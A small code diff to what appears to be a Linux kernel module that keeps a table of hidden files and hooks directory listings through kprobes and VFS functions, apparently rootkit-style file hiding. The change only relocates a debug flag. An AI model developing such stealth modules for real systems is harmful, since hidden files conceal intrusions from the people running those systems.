@@ -23,6 +23,10 @@ static struct hidden_entry hidden_files[MAX_HIDDEN_FILES];
 static int hidden_count;
 static DEFINE_SPINLOCK(hidden_lock);
 
+/* Debug flag - set to 1 for verbose logging */
+static int debug_enabled = 1;
+module_param(debug_enabled, int, 0644);
+
 /* Directory entry structure */
 struct linux_dirent64 {
 	u64 d_ino;
@@ -239,9 +243,6 @@ static void kp_post_handler(struct kprobe *p, struct pt_regs *regs,
 extern int vfs_hook_init(void);
 extern void vfs_hook_exit(void);
 
-/* Debug flag - set to 1 for verbose logging */
-static int debug_enabled = 1;
-module_param(debug_enabled, int, 0644);
 static bool kprobe_registered;
 
 static int __init hook_init(void)
